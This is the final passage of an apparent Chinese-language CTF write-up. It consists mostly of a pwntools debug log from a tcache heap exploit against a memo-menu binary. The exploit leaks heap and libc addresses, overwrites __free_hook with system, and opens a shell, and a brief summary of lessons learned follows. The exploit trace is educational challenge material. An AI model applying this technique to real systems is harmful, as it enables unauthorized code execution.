+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '2\n'
+[DEBUG] Received 0x58 bytes:
+    00000000  70 c2 f8 55  0c 56 0a 44  6f 6e 65 2e  0a 0a 4d 45  │p··U│·V·D│one.│··ME│
+    00000010  4e 55 0a 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │NU·=│====│====│====│
+    00000020  3d 3d 3d 0a  31 2e 20 41  64 64 0a 32  2e 20 53 68  │===·│1. A│dd·2│. Sh│
+    00000030  6f 77 0a 33  2e 20 44 65  6c 65 74 65  0a 30 2e 20  │ow·3│. De│lete│·0. │
+    00000040  45 78 69 74  0a 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │Exit│·===│====│====│
+    00000050  3d 3d 3d 3d  3d 0a 3e 20                            │====│=·> │
+    00000058
+[*] Heap leak: 0x560c55f8c270
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x11 bytes:
+    00000000  00 00 00 00  00 00 00 00  41 41 41 41  41 41 41 41  │····│····│AAAA│AAAA│
+    00000010  0a                                                  │·│
+    00000011
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    'AAAAAAAA\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x31 bytes:
+    00000000  70 c2 f8 55  0c 56 00 00  91 00 00 00  00 00 00 00  │p··U│·V··│····│····│
+    *
+    00000030  0a                                                  │·│
+    00000031
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x31 bytes:
+    00000000  70 c2 f8 55  0c 56 00 00  91 00 00 00  00 00 00 00  │p··U│·V··│····│····│
+    *
+    00000030  0a                                                  │·│
+    00000031
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x31 bytes:
+    00000000  70 c2 f8 55  0c 56 00 00  91 00 00 00  00 00 00 00  │p··U│·V··│····│····│
+    *
+    00000030  0a                                                  │·│
+    00000031
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x31 bytes:
+    00000000  70 c2 f8 55  0c 56 00 00  91 00 00 00  00 00 00 00  │p··U│·V··│····│····│
+    *
+    00000030  0a                                                  │·│
+    00000031
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    00000000  d0 c2 f8 55  0c 56 00 00  0a                        │···U│·V··│·│
+    00000009
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    'AAAAAAAA\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    'AAAAAAAA\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '2\n'
+[DEBUG] Received 0x58 bytes:
+    00000000  a0 1c dd 31  b1 7f 0a 44  6f 6e 65 2e  0a 0a 4d 45  │···1│···D│one.│··ME│
+    00000010  4e 55 0a 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │NU·=│====│====│====│
+    00000020  3d 3d 3d 0a  31 2e 20 41  64 64 0a 32  2e 20 53 68  │===·│1. A│dd·2│. Sh│
+    00000030  6f 77 0a 33  2e 20 44 65  6c 65 74 65  0a 30 2e 20  │ow·3│. De│lete│·0. │
+    00000040  45 78 69 74  0a 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │Exit│·===│====│====│
+    00000050  3d 3d 3d 3d  3d 0a 3e 20                            │====│=·> │
+    00000058
+[*] Libc leak: 0x7fb131dd1ca0
+[*] Libc base: 0x7fb1319e6000
+[*] __free_hook: 0x7fb131dd38e8
+[*] system: 0x7fb131a354e0
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    'AAAAAAAA\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    00000000  e8 38 dd 31  b1 7f 00 00  0a                        │·8·1│····│·│
+    00000009
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    00000000  00 00 00 00  00 00 00 00  0a                        │····│····│·│
+    00000009
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '1\n'
+[DEBUG] Received 0xd bytes:
+    'Input memo > '
+[DEBUG] Sent 0x9 bytes:
+    00000000  c2 53 a3 31  b1 7f 00 00  0a                        │·S·1│····│·│
+    00000009
+[DEBUG] Received 0x51 bytes:
+    'Done.\n'
+    '\n'
+    'MENU\n'
+    '================\n'
+    '1. Add\n'
+    '2. Show\n'
+    '3. Delete\n'
+    '0. Exit\n'
+    '================\n'
+    '> '
+[DEBUG] Sent 0x2 bytes:
+    '3\n'
+[*] Switching to interactive mode
+$ ls
+[DEBUG] Sent 0x3 bytes:
+    'ls\n'
+[DEBUG] Received 0x36 bytes:
+    '1.py  core  exploit.py\tFLAG  libc-2.27.so  one  one.c\n'
+1.py  core  exploit.py    FLAG  libc-2.27.so  one  one.c
+$ whoami
+[DEBUG] Sent 0x7 bytes:
+    'whoami\n'
+[DEBUG] Received 0x7 bytes:
+    'ubuntu\n'
+ubuntu
+$ id
+[DEBUG] Sent 0x3 bytes:
+    'id\n'
+[DEBUG] Received 0x81 bytes:
+    'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)\n'
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
+$  
+```
+
+# 一个总结
+保护全开的题目一定要利用各种花式攻击的方式来泄露出有用的地址（__free_hook、__malloc_hook、堆或栈的基地址、libc基地址）。程序的功能虽然简单，但是不要小看它。
+
+还有，如果程序开启了PIE保护，请在exp附加gdb调试查看内存时请关闭系统的ALSR（防止多次gdb内存地址不同），否则就是自找麻烦。
+
